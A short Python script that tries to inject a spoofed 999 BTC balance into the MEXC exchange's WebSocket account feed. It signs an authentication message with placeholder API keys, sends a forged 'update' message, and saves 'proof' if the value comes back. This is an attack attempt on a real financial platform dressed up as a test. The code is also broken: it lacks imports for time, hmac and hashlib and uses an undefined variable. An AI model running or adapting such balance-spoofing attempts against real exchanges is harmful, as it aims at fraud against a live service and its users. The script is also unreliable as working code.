import asyncio
import websockets
import json
from datetime import datetime

async def verify_balance_spoof():
    """Tests if spoofed balances appear in account feeds"""
    try:
        print("🔵 [1/4] Connecting to WebSocket...")
        async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
            
            # Authenticate (replace placeholders)
            timestamp = int(time.time() * 1000)
            sig = hmac.new(
                "YOUR_API_SECRET".encode(),
                f"timestamp={timestamp}".encode(),
                hashlib.sha256
            ).hexdigest()
            
            await ws.send(json.dumps({
                "op": "auth",
                "args": ["YOUR_API_KEY", timestamp, sig]
            }))
            print("🟢 [2/4] Authenticated")
            
            # Inject spoofed balance
            await ws.send(json.dumps({
                "op": "update",
                "args": [{
                    "currency": "BTC",
                    "balance": "999.0",  # Highly noticeable value
                    "available": "999.0",
                    "update_type": "inject_test"  # Tag for identification
                }]
            }))
            print("🟡 [3/4] Injected 999 BTC balance")
            
            # Monitor account stream
            print("🔵 [4/4] Monitoring account stream...")
            start_time = time.time()
            while time.time() - start_time < 30:  # 30s observation window
                msg = await asyncio.wait_for(ws.recv(), timeout=10)
                if "999.0" in msg:
                    print(f"🔴 BALANCE SPOOF SUCCESS:\n{msg}")
                    with open("balance_spoof_proof.txt", "w") as f:
                        f.write(f"{datetime.now()}\nInjection:\n{json.dumps(spoofed_balance, indent=2)}\nResponse:\n{msg}")
                    return
            print("🟢 No spoofed balance detected in account stream")
            
    except Exception as e:
        print(f"🔴 Error: {str(e)}")

asyncio.run(verify_balance_spoof())
